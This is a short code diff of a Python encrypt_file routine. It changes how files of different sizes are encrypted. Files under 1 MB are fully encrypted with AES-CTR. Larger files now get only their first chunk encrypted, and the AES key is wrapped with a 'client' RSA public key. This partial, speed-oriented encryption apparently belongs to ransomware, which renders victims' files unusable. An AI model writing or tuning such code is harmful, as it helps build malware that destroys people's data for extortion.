@@ -136,17 +136,10 @@ def encrypt_file(path, cpub_key, dry_run=False):
     nonce = secrets.token_bytes(16)    # generate 128-bit nonce for CTR mode
 
     # Select partial or full encryption depending on file size
-    if size < 1_048_576:
+    if size < 1_048_576: # Fully encrypt files <1MB
         enc = encrypt_chunk(data, aes_key, nonce)
-    elif size < 4_194_304:
-        enc = encrypt_chunk(data[:CHUNK_SIZE], aes_key, nonce) + data[CHUNK_SIZE:]
     else:
-        offset = size // 3
-        enc = (
-            data[:offset] +
-            encrypt_chunk(data[offset : offset + CHUNK_SIZE], aes_key, nonce) +
-            data[offset + CHUNK_SIZE:]
-        )
+        enc = encrypt_chunk(data[:CHUNK_SIZE], aes_key, nonce) + data[CHUNK_SIZE:]
 
     # Encrypt the AES key using the client's public RSA key
     enc_key = cpub_key.encrypt(
